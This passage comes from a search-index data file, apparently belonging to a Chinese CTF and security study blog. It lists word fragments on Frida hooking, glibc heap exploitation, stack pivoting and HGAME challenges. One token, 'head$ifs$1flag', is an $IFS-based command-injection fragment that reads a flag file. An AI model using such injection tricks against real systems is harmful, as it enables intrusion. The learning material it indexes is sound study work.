\":14,\"60\":2,\"65\":17,\"66\":4}}],[\">bk也就是fd+0x18的位置为p\",{\"1\":{\"66\":1}}],[\">bk等于fd\",{\"1\":{\"65\":1}}],[\">bk和bk\",{\"1\":{\"65\":1,\"66\":1}}],[\">bk与\",{\"1\":{\"39\":1}}],[\">bk设置为\",{\"1\":{\"39\":1}}],[\">bk\",{\"1\":{\"39\":13,\"65\":14,\"66\":4}}],[\">劫持程序流程\",{\"1\":{\"25\":1}}],[\">栈迁移\",{\"1\":{\"25\":1}}],[\">\",{\"1\":{\"19\":5,\"25\":1,\"90\":1}}],[\">java\",{\"1\":{\"8\":1}}],[\"80\",{\"1\":{\"85\":1}}],[\"8个\",{\"1\":{\"70\":1}}],[\"8个chunk\",{\"1\":{\"70\":1}}],[\"8byte\",{\"0\":{\"22\":1}}],[\"8\",{\"1\":{\"19\":1,\"32\":1,\"33\":1,\"35\":2,\"70\":2,\"71\":1,\"89\":1,\"91\":2}}],[\"888\",{\"1\":{\"12\":1,\"13\":1}}],[\"执行exec\",{\"1\":{\"75\":1}}],[\"执行成功\",{\"1\":{\"19\":1}}],[\"执行完上面的hook指令后发现了报错\",{\"1\":{\"19\":1}}],[\"然后分别开启四个函数\",{\"1\":{\"90\":1}}],[\"然后在我们输入最后的位置加入249数据\",{\"1\":{\"90\":1}}],[\"然后在scanf里面下idapython脚本\",{\"1\":{\"85\":1}}],[\"然后在malloc的时候没有检查size\",{\"1\":{\"63\":1}}],[\"然后准备对应环境\",{\"1\":{\"75\":1}}],[\"然后就是寻找ld\",{\"1\":{\"74\":1}}],[\"然后就会执行\",{\"1\":{\"25\":1}}],[\"然后修改思路\",{\"1\":{\"71\":1}}],[\"然后我发现一个状况\",{\"1\":{\"70\":1}}],[\"然后我们修改chunk2fd指向我们想要修改的地方\",{\"1\":{\"60\":1}}],[\"然后我们malloc一下\",{\"1\":{\"60\":1}}],[\"然后我们就可以通过\",{\"1\":{\"46\":1}}],[\"然后我们就得到了main\",{\"1\":{\"30\":1}}],[\"然后我们就成功完成了一次栈迁移\",{\"1\":{\"25\":1}}],[\"然后我们得到了一堆数据\",{\"1\":{\"19\":1}}],[\"然后malloc\",{\"1\":{\"70\":1}}],[\"然后malloc要回来\",{\"1\":{\"69\":1}}],[\"然后free\",{\"1\":{\"70\":1}}],[\"然后fd\",{\"1\":{\"65\":1}}],[\"然后根据add函数的逻辑\",{\"1\":{\"69\":1}}],[\"然后根据源码\",{\"1\":{\"60\":1}}],[\"然后那么根据源码最终ptr会指向fd也就是ptr\",{\"1\":{\"66\":1}}],[\"然后多的一个字节为0的话\",{\"1\":{\"66\":1}}],[\"然后bk\",{\"1\":{\"65\":1}}],[\"然后此时chunk1的fd指向chunk2然后我们再次free\",{\"1\":{\"60\":1}}],[\"然后chunk入链\",{\"1\":{\"56\":1}}],[\"然后从top\",{\"1\":{\"51\":2}}],[\"然后找\",{\"1\":{\"51\":1}}],[\"然后再free\",{\"1\":{\"69\":1}}],[\"然后再从top\",{\"1\":{\"50\":1}}],[\"然后再搜索top\",{\"1\":{\"50\":1}}],[\"然后当p为0的时候\",{\"1\":{\"50\":1}}],[\"然后直接打印出来\",{\"1\":{\"36\":1}}],[\"然后是否内存对齐\",{\"1\":{\"32\":1}}],[\"然后执行指令ret\",{\"1\":{\"25\":1}}],[\"然后搜索发现是我修改了默认的端口号为11451\",{\"1\":{\"19\":1}}],[\"然后搜索package=xxxx这个xxxx就是包的名字\",{\"1\":{\"18\":1}}],[\"然后发生报错\",{\"1\":{\"19\":1}}],[\"然后\",{\"1\":{\"19\":1,\"25\":1,\"32\":1,\"46\":1,\"57\":1}}],[\"0ll\",{\"1\":{\"89\":10,\"90\":1}}],[\"00\",{\"1\":{\"85\":1}}],[\"00000000004007f4\",{\"1\":{\"85\":1}}],[\"0即可\",{\"1\":{\"66\":1}}],[\"0xfa\",{\"1\":{\"92\":1}}],[\"0xfffffffc\",{\"1\":{\"92\":1}}],[\"0xffffffda\",{\"1\":{\"92\":1}}],[\"0xffffff9b\",{\"1\":{\"92\":1}}],[\"0xffffff95\",{\"1\":{\"92\":1}}],[\"0xffffff9c\",{\"1\":{\"92\":1}}],[\"0xffffff92\",{\"1\":{\"92\":1}}],[\"0x00001f11\",{\"1\":{\"92\":1}}],[\"0x0000177b\",{\"1\":{\"92\":1}}],[\"0x000040ce\",{\"1\":{\"92\":1}}],[\"0x00004506\",{\"1\":{\"92\":1}}],[\"0x00004ff3\",{\"1\":{\"92\":1}}],[\"0x000052fb\",{\"1\":{\"92\":1}}],[\"0x000055e22cd98a10+0x30+0x110\",{\"1\":{\"30\":1}}],[\"0x000029e3\",{\"1\":{\"92\":1}}],[\"0x00002989\",{\"1\":{\"92\":1}}],[\"0x000028b4\",{\"1\":{\"92\":1}}],[\"0x000028fa\",{\"1\":{\"92\":1}}],[\"0x00002a6f\",{\"1\":{\"92\":1}}],[\"0x00002b71\",{\"1\":{\"92\":1}}],[\"0x0000264f\",{\"1\":{\"92\":1}}],[\"0x00002f14\",{\"1\":{\"92\":1}}],[\"0x00006b4b\",{\"1\":{\"92\":1}}],[\"0x000032d8\",{\"1\":{\"92\":1}}],[\"0x000000ff\",{\"1\":{\"92\":1}}],[\"0x0000000f\",{\"1\":{\"92\":1}}],[\"0x0000007d\",{\"1\":{\"92\":1}}],[\"0x0000001d\",{\"1\":{\"92\":1}}],[\"0x00000014\",{\"1\":{\"92\":1}}],[\"0x0000005b\",{\"1\":{\"92\":1}}],[\"0x0000006d\",{\"1\":{\"92\":2}}],[\"0x0000004e\",{\"1\":{\"92\":2}}],[\"0x69\",{\"1\":{\"91\":1,\"92\":1}}],[\"0x65\",{\"1\":{\"91\":1,\"92\":1}}],[\"0x66\",{\"1\":{\"91\":1,\"92\":1}}],[\"0x61fe1c\",{\"1\":{\"85\":1}}],[\"0x28u\",{\"1\":{\"89\":1}}],[\"0x20\",{\"1\":{\"33\":2,\"69\":1}}],[\"0x30\",{\"1\":{\"86\":1}}],[\"0xc7df9b0041348000\",{\"1\":{\"85\":1}}],[\"0x78\",{\"1\":{\"91\":1,\"92\":1}}],[\"0x74\",{\"1\":{\"91\":1,\"92\":1}}],[\"0x77\",{\"1\":{\"91\":1,\"92\":1}}],[\"0x7fffffffdee4\",{\"1\":{\"85\":1}}],[\"0x7f566befac78\",{\"1\":{\"30\":1}}],[\"0x7620656854006625\",{\"1\":{\"85\":1}}],[\"0x555555556004\",{\"1\":{\"85\":1}}],[\"0x5555555551c7\",{\"1\":{\"85\":1}}],[\"0x55e22cd98000+0x10\",{\"1\":{\"30\":1}}],[\"0x41348000\",{\"1\":{\"86\":1}}],[\"0x400000\",{\"1\":{\"84\":1}}],[\"0x420\",{\"1\":{\"69\":1}}],[\"0x90\",{\"1\":{\"71\":1}}],[\"0xa0\",{\"1\":{\"70\":2,\"71\":1}}],[\"0x8\",{\"1\":{\"50\":1}}],[\"0x11u\",{\"1\":{\"89\":1,\"91\":1}}],[\"0x18的位置\",{\"1\":{\"66\":1}}],[\"0x18\",{\"1\":{\"39\":3,\"66\":1,\"70\":1,\"71\":1}}],[\"0x10\",{\"1\":{\"30\":1,\"36\":1,\"39\":3,\"60\":1,\"66\":1,\"70\":2,\"71\":2}}],[\"0x\",{\"1\":{\"33\":1}}],[\"0\",{\"1\":{\"19\":9,\"33\":4,\"35\":1,\"39\":2,\"44\":4,\"60\":6,\"65\":1,\"66\":1,\"70\":7,\"71\":8,\"78\":1,\"84\":2,\"85\":1,\"88\":1,\"89\":9,\"91\":12,\"92\":3}}],[\"x00\",{\"1\":{\"70\":2,\"71\":2}}],[\"x86\",{\"1\":{\"44\":1,\"77\":1}}],[\"x\",{\"1\":{\"30\":2,\"33\":2,\"79\":1}}],[\"x19`\",{\"1\":{\"19\":1}}],[\"x19\",{\"1\":{\"18\":1,\"19\":4,\"21\":1}}],[\"xml文件\",{\"1\":{\"18\":1}}],[\"xxx\",{\"1\":{\"6\":1}}],[\"xxxxx\",{\"1\":{\"6\":1}}],[\"xxxxxx\",{\"1\":{\"6\":1}}],[\"xxxx\",{\"1\":{\"2\":2,\"6\":1}}],[\"去large\",{\"1\":{\"51\":1}}],[\"去完成绑定\",{\"1\":{\"44\":1}}],[\"去找到androidmainfest\",{\"1\":{\"18\":1}}],[\"去hook脚本\",{\"1\":{\"6\":1}}],[\"错了别打我\",{\"1\":{\"15\":1}}],[\"应该\",{\"1\":{\"15\":1}}],[\"循环输出所有方法\",{\"1\":{\"14\":1}}],[\"循环hook所有重载方法\",{\"1\":{\"11\":1}}],[\"gnu\",{\"1\":{\"77\":1}}],[\"going\",{\"1\":{\"60\":1}}],[\"goto\",{\"1\":{\"60\":3}}],[\"got\",{\"1\":{\"44\":3}}],[\"got表和plt表详细解说\",{\"0\":{\"44\":1}}],[\"gets\",{\"1\":{\"84\":1}}],[\"get\",{\"1\":{\"63\":1,\"70\":2,\"71\":2,\"85\":1,\"89\":1,\"91\":2}}],[\"getting\",{\"1\":{\"60\":1}}],[\"getdeclaredmethods\",{\"1\":{\"14\":1,\"19\":1}}],[\"gdb调试一下\",{\"1\":{\"85\":1}}],[\"gdb\",{\"0\":{\"54\":1},\"1\":{\"70\":1,\"71\":1,\"86\":1}}],[\"global\",{\"1\":{\"44\":1}}],[\"glibc\",{\"1\":{\"28\":1,\"52\":2,\"63\":1}}],[\"guess\",{\"1\":{\"84\":1,\"86\":1}}],[\"gundam\",{\"0\":{\"26\":1}}],[\"guishouflags\",{\"1\":{\"13\":1}}],[\"guishou\",{\"1\":{\"12\":1}}],[\"g\",{\"1\":{\"21\":2,\"79\":1}}],[\"gadget链来实现\",{\"1\":{\"25\":1}}],[\"gadget\",{\"1\":{\"19\":2,\"21\":1}}],[\"m\",{\"1\":{\"79\":2}}],[\"my\",{\"1\":{\"78\":1}}],[\"mstate\",{\"1\":{\"65\":1}}],[\"mp\",{\"1\":{\"63\":2}}],[\"mchunkptr\",{\"1\":{\"60\":1,\"65\":3,\"66\":2}}],[\"mutex\",{\"1\":{\"60\":2}}],[\"menu\",{\"1\":{\"70\":4,\"71\":4}}],[\"memory\",{\"1\":{\"63\":1}}],[\"mem\",{\"1\":{\"60\":4}}],[\"methods\",{\"1\":{\"14\":1,\"19\":4}}],[\"methods=clz\",{\"1\":{\"14\":1}}],[\"mmap函数\",{\"1\":{\"48\":1,\"51\":1}}],[\"mmap\",{\"1\":{\"48\":1}}],[\"might\",{\"1\":{\"60\":3}}],[\"mildly\",{\"1\":{\"29\":1}}],[\"microsoft\",{\"1\":{\"19\":1}}],[\"modifications\",{\"1\":{\"60\":1}}],[\"movq\",{\"1\":{\"44\":1}}],[\"mov\",{\"1\":{\"25\":1}}],[\"more命令\",{\"1\":{\"79\":1}}],[\"more\",{\"1\":{\"19\":1,\"79\":1}}],[\"matches\",{\"1\":{\"63\":1}}],[\"matter\",{\"1\":{\"0\":1}}],[\"map\",{\"1\":{\"44\":2,\"45\":1}}],[\"malloc函数\",{\"1\":{\"57\":1}}],[\"malloc源码分析\",{\"0\":{\"57\":1}}],[\"malloc\",{\"1\":{\"33\":1,\"36\":1,\"39\":2,\"52\":2,\"63\":1,\"65\":3,\"66\":2}}],[\"malloc的时候优先去tcahe中找\",{\"1\":{\"28\":1}}],[\"max\",{\"1\":{\"27\":1,\"29\":2,\"56\":1}}],[\"main+33\",{\"1\":{\"70\":1,\"71\":1}}],[\"main函数\",{\"1\":{\"68\":1}}],[\"main\",{\"1\":{\"9\":2,\"12\":1,\"13\":1,\"19\":3,\"33\":1,\"85\":3,\"86\":1,\"89\":1,\"92\":1}}],[\"根据类名获取java类\",{\"1\":{\"14\":1}}],[\"输出\",{\"1\":{\"82\":1}}],[\"输出类名\",{\"1\":{\"14\":1}}],[\"输出结果\",{\"1\":{\"9\":1,\"11\":1}}],[\"19\",{\"1\":{\"91\":1}}],[\"18\",{\"1\":{\"91\":1}}],[\"18h\",{\"1\":{\"89\":1}}],[\"17\",{\"1\":{\"91\":1}}],[\"15\",{\"1\":{\"91\":1}}],[\"14\",{\"1\":{\"91\":1}}],[\"13\",{\"1\":{\"91\":1}}],[\"1u\",{\"1\":{\"89\":1}}],[\"11\",{\"1\":{\"84\":2,\"85\":2,\"91\":1}}],[\"11451\",{\"1\":{\"19\":4,\"21\":1}}],[\"1存的就是link\",{\"1\":{\"44\":1}}],[\"12\",{\"1\":{\"35\":2,\"91\":1}}],[\"127\",{\"1\":{\"19\":4}}],[\"10个chunk\",{\"1\":{\"70\":1}}],[\"100\",{\"1\":{\"63\":1,\"79\":2}}],[\"10\",{\"1\":{\"35\":2,\"70\":1,\"71\":1,\"91\":1}}],[\"16\",{\"1\":{\"15\":1,\"19\":1,\"33\":1,\"35\":3,\"91\":1}}],[\"1\",{\"0\":{\"62\":1,\"67\":1},\"1\":{\"14\":2,\"19\":6,\"33\":1,\"44\":4,\"60\":1,\"63\":1,\"70\":1,\"71\":1,\"79\":1,\"89\":1,\"90\":3,\"91\":11,\"92\":9}}],[\"对value变量xor\",{\"1\":{\"90\":1}}],[\"对类名进行过滤\",{\"1\":{\"14\":1}}],[\"对应js的写法\",{\"1\":{\"12\":1}}],[\"每次去使用xclibc的时候\",{\"1\":{\"73\":1}}],[\"每个最多存7个chunk\",{\"1\":{\"59\":1}}],[\"每个tcache最多收取7个chunk\",{\"1\":{\"59\":1}}],[\"每条链上最多可以有7个chunk\",{\"1\":{\"28\":1}}],[\"每枚举一个类调用一次\",{\"1\":{\"14\":1}}],[\"每遍历一个对象都会调用onmatch\",{\"1\":{\"13\":1}}],[\"eax\",{\"1\":{\"91\":1}}],[\"each\",{\"1\":{\"29\":2}}],[\"eof\",{\"1\":{\"79\":1}}],[\"echo\",{\"1\":{\"78\":1,\"82\":1}}],[\"etc\",{\"1\":{\"74\":1}}],[\"empty\",{\"1\":{\"70\":1}}],[\"emo\",{\"1\":{\"35\":1,\"36\":3}}],[\"e\",{\"1\":{\"60\":1,\"63\":4,\"79\":1}}],[\"errout\",{\"1\":{\"60\":3}}],[\"error\",{\"1\":{\"19\":1}}],[\"errstr\",{\"1\":{\"60\":3}}],[\"else\",{\"1\":{\"65\":2,\"84\":1}}],[\"elixir\",{\"1\":{\"52\":1}}],[\"elf\",{\"1\":{\"46\":6}}],[\"editemo的时候是根据判断emo\",{\"1\":{\"36\":1}}],[\"ezchunk\",{\"0\":{\"34\":1}}],[\"eip存入我们的read\",{\"1\":{\"25\":1}}],[\"eip\",{\"1\":{\"25\":2}}],[\"esp\",{\"1\":{\"25\":2}}],[\"ebp的\",{\"1\":{\"25\":1}}],[\"ebp的地方\",{\"1\":{\"25\":1}}],[\"ebp的地址上\",{\"1\":{\"24\":1}}],[\"ebp2的地址给了rbp\",{\"1\":{\"25\":1}}],[\"ebp1\",{\"1\":{\"25\":1}}],[\"ebp寄存器\",{\"1\":{\"25\":1}}],[\"ebp\",{\"1\":{\"24\":1,\"25\":4}}],[\"exchange\",{\"1\":{\"60\":1}}],[\"expect\",{\"1\":{\"39\":2,\"60\":4,\"65\":1,\"66\":1}}],[\"explore\",{\"1\":{\"21\":1}}],[\"explore但是报错\",{\"1\":{\"21\":1}}],[\"exit\",{\"1\":{\"19\":2,\"78\":1,\"90\":1}}],[\"example\",{\"1\":{\"9\":1,\"11\":2,\"12\":1,\"13\":2,\"14\":2}}],[\"env\",{\"1\":{\"89\":1,\"91\":1}}],[\"envp\",{\"1\":{\"85\":2}}],[\"enabled\",{\"1\":{\"84\":1}}],[\"encode\",{\"1\":{\"70\":3,\"71\":3}}],[\"entries\",{\"1\":{\"29\":2}}],[\"entry\",{\"1\":{\"29\":4,\"60\":1,\"63\":3}}],[\"entry代表着当前bin的首个chunk\",{\"1\":{\"29\":1}}],[\"enter\",{\"1\":{\"15\":1}}],[\"enumerateclassloaderssync\",{\"1\":{\"14\":1}}],[\"enumerateloadedclasses\",{\"1\":{\"14\":1,\"19\":1}}],[\"异步方式\",{\"1\":{\"14\":1}}],[\"枚举方法同上\",{\"1\":{\"14\":1}}],[\"枚举完成以后调用\",{\"1\":{\"14\":1}}],[\"枚举已经加载的类\",{\"1\":{\"14\":2}}],[\"枚举所有的类和方法\",{\"0\":{\"14\":1}}],[\"遍历完成后调用oncomplete\",{\"1\":{\"13\":1}}],[\"字段名和函数名相同需要加下划线\",{\"1\":{\"13\":1}}],[\"work\",{\"1\":{\"84\":1}}],[\"world\",{\"1\":{\"13\":1,\"19\":1}}],[\"wait\",{\"1\":{\"88\":1,\"90\":1}}],[\"waite\",{\"1\":{\"70\":4,\"71\":4}}],[\"wasted\",{\"1\":{\"63\":1}}],[\"was\",{\"1\":{\"63\":1}}],[\"want\",{\"1\":{\"60\":1}}],[\"will\",{\"1\":{\"33\":1}}],[\"windows\",{\"1\":{\"19\":1}}],[\"while\",{\"1\":{\"33\":1,\"60\":1,\"78\":1,\"90\":1}}],[\"which\",{\"1\":{\"29\":1}}],[\"week2\",{\"0\":{\"97\":1}}],[\"we\",{\"1\":{\"29\":1,\"60\":6,\"63\":3}}],[\"wrapper类的method方法\",{\"1\":{\"9\":1}}],[\"hgame\",{\"0\":{\"97\":1}}],[\"hgameweek2babyre\",{\"0\":{\"87\":1}}],[\"hgame的week3的一道题\",{\"1\":{\"67\":1}}],[\"hilite\",{\"1\":{\"79\":1}}],[\"hitcon\",{\"0\":{\"26\":1}}],[\"h>\",{\"1\":{\"33\":2,\"85\":1,\"88\":1,\"92\":1}}],[\"have\",{\"1\":{\"29\":1,\"60\":8}}],[\"handler\",{\"1\":{\"14\":1,\"19\":1,\"89\":1,\"91\":1}}],[\"hex\",{\"1\":{\"70\":2,\"71\":2,\"85\":1}}],[\"here\",{\"1\":{\"63\":1}}],[\"head$ifs$1flag\",{\"1\":{\"83\":1}}],[\"head命令\",{\"1\":{\"79\":1}}],[\"head\",{\"1\":{\"58\":1,\"79\":4}}],[\"heap可以查看当前的chunk\",{\"1\":{\"40\":1}}],[\"heap\",{\"1\":{\"30\":1,\"38\":1}}],[\"hence\",{\"1\":{\"29\":1}}],[\"help\",{\"1\":{\"19\":2,\"79\":1}}],[\"hello\",{\"1\":{\"13\":1}}],[\"https\",{\"1\":{\"19\":1,\"52\":1}}],[\"h\",{\"1\":{\"19\":2}}],[\"however\",{\"1\":{\"63\":1}}],[\"hook无导出函数\",{\"1\":{\"15\":1}}],[\"hook构造函数\",{\"1\":{\"12\":1}}],[\"hook构造方法\",{\"0\":{\"12\":1}}],[\"hooktest9\",{\"1\":{\"15\":1}}],[\"hooktest6\",{\"1\":{\"14\":1}}],[\"hooktest4\",{\"1\":{\"13\":1}}],[\"hooktest3\",{\"1\":{\"12\":1}}],[\"hooktest2\",{\"1\":{\"11\":1}}],[\"hooktest1\",{\"1\":{\"11\":1}}],[\"hook所有重载函数\",{\"1\":{\"11\":1}}],[\"hook重载方法\",{\"1\":{\"11\":1}}],[\"hook重载函数\",{\"0\":{\"11\":1}}],[\"hookdemo01\",{\"1\":{\"9\":1,\"11\":2,\"12\":1,\"13\":2,\"14\":2}}],[\"hook\",{\"0\":{\"5\":1,\"15\":1,\"19\":1},\"1\":{\"9\":1,\"11\":1,\"15\":2,\"19\":2}}],[\"hook相关\",{\"0\":{\"4\":1}}],[\"homepage\",{\"1\":{\"0\":1}}],[\"home\",{\"0\":{\"0\":1},\"1\":{\"0\":2,\"19\":1,\"84\":1}}],[\"++n\",{\"1\":{\"90\":1}}],[\"++j\",{\"1\":{\"89\":1}}],[\"++i\",{\"1\":{\"89\":1,\"91\":1}}],[\"+p32\",{\"1\":{\"86\":1}}],[\"+1\",{\"1\":{\"70\":2,\"71\":2}}],[\"+12\",{\"1\":{\"35\":1}}],[\"+=\",{\"1\":{\"70\":5,\"71\":5,\"90\":1,\"92\":1}}],[\"+8\",{\"1\":{\"35\":1}}],[\"+40\",{\"1\":{\"35\":1}}],[\"+20\",{\"1\":{\"35\":1}}],[\"+0xf\",{\"1\":{\"32\":1,\"33\":1}}],[\"+size所占字节数\",{\"1\":{\"32\":1}}],[\"+fun\",{\"1\":{\"15\":1}}],[\"+\",{\"0\":{\"66\":1},\"1\":{\"15\":1,\"32\":1,\"33\":1,\"35\":8,\"39\":4,\"70\":1,\"71\":1,\"89\":2,\"90\":3,\"91\":1,\"92\":9}}],[\"+this\",{\"1\":{\"13\":2}}],[\"+num\",{\"1\":{\"11\":1}}],[\"在失败时返回非零错误编号\",{\"1\":{\"88\":1}}],[\"在处理文本时会将这些字符视为字段之间的分隔符\",{\"1\":{\"81\":1}}],[\"在处理多个文件时不打印每个文件的名称作为头部\",{\"1\":{\"79\":1}}],[\"在退出\",{\"1\":{\"79\":1}}],[\"在到达文件末尾时自动退出\",{\"1\":{\"79\":1}}],[\"在搜索时忽略大小写\",{\"1\":{\"79\":1}}],[\"在写入内容的时候最后加了一个0导致我们没办法读出来\",{\"1\":{\"72\":1}}],[\"在使用的就只有prev\",{\"1\":{\"50\":1}}],[\"在linux中\",{\"1\":{\"48\":1}}],[\"在\",{\"1\":{\"44\":1}}],[\"在delemo的时候是根据emo\",{\"1\":{\"36\":1}}],[\"在addemo的时候name\",{\"1\":{\"36\":1}}],[\"在hook函数之后执行\",{\"1\":{\"15\":1}}],[\"在hook函数之前执行\",{\"1\":{\"15\":1}}],[\"在整个搜索流程完成的时候会调用\",{\"1\":{\"13\":1}}],[\"在调用的时候只需要修改参数就可以实现调用不同的实现由于函数名字是一样的所以我猜测frida就难以仅仅靠一个名字来实现hook了\",{\"1\":{\"11\":1}}],[\"所以参与下面加密函数的value值为\",{\"1\":{\"91\":1}}],[\"所以才改后缀为py\",{\"1\":{\"78\":1}}],[\"所以说这个变量是开发的时候编译使用\",{\"1\":{\"74\":1}}],[\"所以就重新了解一下patchelf的使用参考文章\",{\"1\":{\"73\":1}}],[\"所以尝试其他思路\",{\"1\":{\"70\":1}}],[\"所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了main\",{\"1\":{\"69\":1}}],[\"所以当执行完ret后整个程序流程就跑到了read\",{\"1\":{\"25\":1}}],[\"所以\",{\"1\":{\"50\":1}}],[\"所以来学习一下基本功学习文章\",{\"1\":{\"47\":1}}],[\"所以总结一下\",{\"1\":{\"46\":1}}],[\"所以got\",{\"1\":{\"44\":1}}],[\"所以每个元素\",{\"1\":{\"35\":1}}],[\"所以直接使用公式\",{\"1\":{\"32\":1}}],[\"所以结构体属性就是下一个chunk的指针\",{\"1\":{\"29\":1}}],[\"所以这里我们是需要构造第二个fake\",{\"1\":{\"25\":1}}],[\"所以我有点想直接覆盖数据为11\",{\"1\":{\"84\":1}}],[\"所以我就决定自己写一个程序来完成这个工作并且好好理解一下怎么计算的\",{\"1\":{\"31\":1}}],[\"所以我带上参数\",{\"1\":{\"19\":1}}],[\"所以我们需要一个alloced\",{\"1\":{\"70\":1}}],[\"所以我们需要overload标明参数\",{\"1\":{\"11\":1}}],[\"所以我们得先填充满tcache\",{\"1\":{\"69\":1}}],[\"所以我们可以构造fd为ptr\",{\"1\":{\"66\":1}}],[\"所以我们一般把tcache填满来绕过\",{\"1\":{\"61\":1}}],[\"所以我们就在每个加密函数里面打idapython的脚本\",{\"1\":{\"91\":1}}],[\"所以我们就是看是否malloc的大小\",{\"1\":{\"32\":1}}],[\"所以我们就不带这个了\",{\"1\":{\"19\":1}}],[\"所以我们只需要把寄存器的值改变就实现了栈迁移\",{\"1\":{\"25\":1}}],[\"所以我们尝试objection\",{\"1\":{\"21\":1}}],[\"所以我们其实可以在callback函数里面用this\",{\"1\":{\"10\":1}}],[\"所以在callback函数中我们的操作对象是每一个对象\",{\"1\":{\"13\":1}}],[\"没找到一个对象就会触发这个callback\",{\"1\":{\"13\":1}}],[\"相当于\",{\"1\":{\"46\":1}}],[\"相当于是告诉我们plt\",{\"1\":{\"46\":1}}],[\"相当于遍历\",{\"1\":{\"13\":1}}],[\"相当于向java层提供了一个callback函数\",{\"1\":{\"8\":1}}],[\"也是用于分页查看文件内容\",{\"1\":{\"79\":1}}],[\"也没有看见什么东西\",{\"1\":{\"78\":1}}],[\"也就是在dest函数下面写入对应的脚本\",{\"1\":{\"91\":1}}],[\"也就是动态共享库的路径\",{\"1\":{\"74\":1}}],[\"也就是下一个chunk的prev\",{\"1\":{\"66\":1}}],[\"也就是下一个free的chunk\",{\"1\":{\"58\":1}}],[\"也就是检查fd\",{\"1\":{\"66\":1}}],[\"也就是payload的部分\",{\"1\":{\"59\":1}}],[\"也就是一个超大的chunk\",{\"1\":{\"50\":1}}],[\"也就是4\",{\"1\":{\"50\":1}}],[\"也就是\",{\"1\":{\"46\":1,\"50\":1}}],[\"也就是会执行push\",{\"1\":{\"44\":1}}],[\"也就是main\",{\"1\":{\"30\":1}}],[\"也就是最后一个加入tcache的chunk\",{\"1\":{\"30\":1}}],[\"也就是找到所有类型为这个类的对象\",{\"1\":{\"13\":1}}],[\"也属于一个堆块\",{\"1\":{\"30\":1}}],[\"也可以不写\",{\"1\":{\"12\":1}}],[\"修改libc的地址\",{\"1\":{\"77\":2}}],[\"修改ld的地址\",{\"1\":{\"77\":1}}],[\"修改程序的\",{\"0\":{\"77\":1}}],[\"修改思路\",{\"0\":{\"71\":1}}],[\"修改每个对象的字段\",{\"1\":{\"13\":1}}],[\"修改非静态字段\",{\"1\":{\"13\":1}}],[\"修改静态字段\",{\"1\":{\"13\":1}}],[\"修改类字段\",{\"1\":{\"13\":1}}],[\"修改类的字段\",{\"0\":{\"13\":1}}],[\"修改参数\",{\"1\":{\"9\":1,\"11\":1}}],[\"$fruit\",{\"1\":{\"82\":1}}],[\"$line\",{\"1\":{\"82\":1}}],[\"$$`\",{\"1\":{\"78\":1}}],[\"$$\",{\"1\":{\"78\":1}}],[\"$\",{\"1\":{\"24\":1,\"78\":12}}],[\"$new\",{\"1\":{\"12\":1}}],[\"$init\",{\"1\":{\"12\":2}}],[\"v9\",{\"1\":{\"89\":3}}],[\"v8\",{\"1\":{\"89\":2}}],[\"v7\",{\"1\":{\"89\":2}}],[\"v4\",{\"1\":{\"85\":4}}],[\"v2\",{\"1\":{\"84\":3}}],[\"v1\",{\"1\":{\"84\":2}}],[\"vim命令\",{\"1\":{\"79\":1}}],[\"vi\",{\"1\":{\"79\":1}}],[\"v\",{\"1\":{\"79\":1}}],[\"vuln\",{\"1\":{\"70\":2,\"71\":2}}],[\"verbose\",{\"1\":{\"79\":1}}],[\"version\",{\"1\":{\"76\":1}}],[\"verify\",{\"1\":{\"63\":1}}],[\"ve\",{\"1\":{\"63\":1}}],[\"vs\",{\"1\":{\"39\":1,\"65\":1,\"66\":1}}],[\"vmmap得到的\",{\"1\":{\"30\":1}}],[\"val\",{\"1\":{\"60\":1}}],[\"value\",{\"1\":{\"13\":2,\"84\":1,\"85\":3,\"89\":1,\"90\":2,\"91\":3,\"92\":5}}],[\"value=999\",{\"1\":{\"13\":2}}],[\"value=\",{\"1\":{\"13\":1}}],[\"vararg\",{\"1\":{\"85\":1}}],[\"var\",{\"1\":{\"9\":2,\"11\":5,\"12\":1,\"13\":1,\"14\":5,\"15\":5,\"19\":3}}],[\"void\",{\"1\":{\"12\":1,\"13\":2,\"54\":1,\"60\":1,\"65\":1,\"88\":6,\"89\":2,\"90\":3,\"92\":4}}],[\"os\",{\"1\":{\"78\":2}}],[\"otherwise\",{\"1\":{\"60\":1}}],[\"or\",{\"1\":{\"60\":1}}],[\"old2\",{\"1\":{\"60\":4}}],[\"old\",{\"1\":{\"60\":12,\"77\":1}}],[\"option\",{\"1\":{\"54\":2}}],[\"options\",{\"1\":{\"19\":1,\"79\":4}}],[\"overall\",{\"1\":{\"29\":1}}],[\"overlap\",{\"1\":{\"37\":1}}],[\"overlength=student\",{\"1\":{\"11\":1}}],[\"overloads\",{\"1\":{\"11\":3}}],[\"overload\",{\"1\":{\"11\":1}}],[\"of\",{\"1\":{\"29\":1,\"33\":1,\"60\":5,\"85\":2}}],[\"off\",{\"0\":{\"66\":1},\"1\":{\"15\":1}}],[\"off=0x7078\",{\"1\":{\"15\":1}}],[\"offset是一个绝对地址\",{\"1\":{\"46\":1}}],[\"offset\",{\"1\":{\"15\":1,\"46\":2,\"60\":4}}],[\"objection\",{\"0\":{\"20\":1},\"1\":{\"21\":1}}],[\"object\",{\"1\":{\"19\":2}}],[\"obj\",{\"1\":{\"13\":4,\"45\":1}}],[\"one\",{\"0\":{\"66\":1},\"1\":{\"29\":1,\"79\":1}}],[\"onenter\",{\"1\":{\"15\":1}}],[\"only\",{\"1\":{\"24\":1,\"60\":1}}],[\"onleave\",{\"1\":{\"15\":1}}],[\"on\",{\"1\":{\"19\":1,\"21\":1,\"63\":1}}],[\"oncomplete\",{\"1\":{\"13\":1,\"14\":1,\"19\":1}}],[\"oncompete\",{\"1\":{\"13\":1}}],[\"onmatch\",{\"1\":{\"13\":2,\"14\":1,\"19\":1}}],[\"out\",{\"1\":{\"12\":1,\"13\":1}}],[\"稍微举列子\",{\"1\":{\"12\":1}}],[\"的值可以改变\",{\"1\":{\"81\":1}}],[\"的工作原理\",{\"0\":{\"81\":1}}],[\"的前\",{\"1\":{\"79\":2}}],[\"的搜索是区分大小写的\",{\"1\":{\"79\":1}}],[\"的翻译\",{\"1\":{\"73\":1}}],[\"的chunk\",{\"1\":{\"70\":2,\"71\":2}}],[\"的位置\",{\"1\":{\"69\":1}}],[\"的参数给\",{\"1\":{\"44\":1}}],[\"的内容为\",{\"1\":{\"44\":1}}],[\"的地方\",{\"1\":{\"44\":1}}],[\"的倍数\",{\"1\":{\"32\":1}}],[\"的\",{\"1\":{\"27\":1}}],[\"的时候相当于会自动去调用函数\",{\"1\":{\"12\":1}}],[\"的方式来hook\",{\"1\":{\"9\":1}}],[\"触发unlink漏洞\",{\"1\":{\"37\":